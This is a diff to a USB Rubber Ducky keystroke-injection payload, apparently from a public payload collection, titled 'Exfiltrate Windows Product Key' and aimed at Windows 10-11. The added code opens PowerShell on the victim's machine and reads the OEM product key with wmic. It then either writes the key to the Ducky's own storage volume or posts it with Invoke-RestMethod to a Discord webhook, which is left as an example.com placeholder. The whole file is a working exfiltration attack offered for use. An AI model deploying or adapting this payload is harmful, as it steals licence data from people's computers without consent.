@@ -1,16 +1,24 @@
-REM ###################################################
-REM #                                                 |
-REM # Title        : Exfiltrate Windows Product Key   |
-REM # Author       : Aleff                            |
-REM # Version      : 1.0                              |
-REM # Category     : Exfiltration                     |
-REM # Target       : Windows 10-11                    |
-REM #                                                 |
-REM ###################################################
-
+REM_BLOCK
+###################################################
+#                                                 |
+# Title        : Exfiltrate Windows Product Key   |
+# Author       : Aleff                            |
+# Version      : 1.0                              |
+# Category     : Exfiltration                     |
+# Target       : Windows 10-11                    |
+#                                                 |
+###################################################
+END_REM
 
 REM Put here your Discord Webhook, i.e. https://discord.com/api/webhooks/0123456789.../abcefg...
 DEFINE #DISCORD-WEBHOOK example.com
+
+REM_BLOCK
+How would you prefer to do the exfiltration?
+Via Discord Webhooks or via Rubber Ducky USB storage?
+If you prefer to use the storage offered by USB Rubber Ducky, set the boolean variable #USB-RUBBER-DUCKY-STORAGE to TRUE, otherwise set it to FALSE and the alternative mode will be automatically selected, so via Discord Webhook.
+END_REM
+DEFINE #USB-RUBBER-DUCKY-STORAGE TRUE
 
 
 EXTENSION DETECT_READY
@@ -47,14 +55,21 @@ STRING powershell
 ENTER
 DELAY 2000
 
-STRINGLN
-	$hookUrl = "#DISCORD-WEBHOOK"
-	$exfiltration = @"
-	$(wmic path softwarelicensingservice get OA3xOriginalProductKey)
-	$(wmic path softwarelicensingservice get OA3xOriginalProductKeyDescription)
-	"@
-	$payload = [PSCustomObject]@{
-		content = $exfiltration
-	}
-	Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json'; exit
-END_STRINGLN
+STRINGLN $key_detected=$(wmic path softwarelicensingservice get OA3xOriginalProductKey)+$(wmic path softwarelicensingservice get OA3xOriginalProductKeyDescription);
+
+IF_DEFINED_TRUE #USB-RUBBER-DUCKY-STORAGE
+    STRINGLN
+        $m=(Get-Volume -FileSystemLabel 'DUCK').DriveLetter;
+        echo $key_detected >> ${m}:\exfiltration.txt
+    END_STRINGLN
+END_IF_DEFINED
+IF_NOT_DEFINED_TRUE #USB-RUBBER-DUCKY-STORAGE
+    STRINGLN
+        $hookUrl = "#DISCORD-WEBHOOK"
+        $exfiltration = @"$key_detected"@
+        $payload = [PSCustomObject]@{
+            content = $exfiltration
+        }
+        Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json'; exit
+    END_STRINGLN
+END_IF_DEFINED
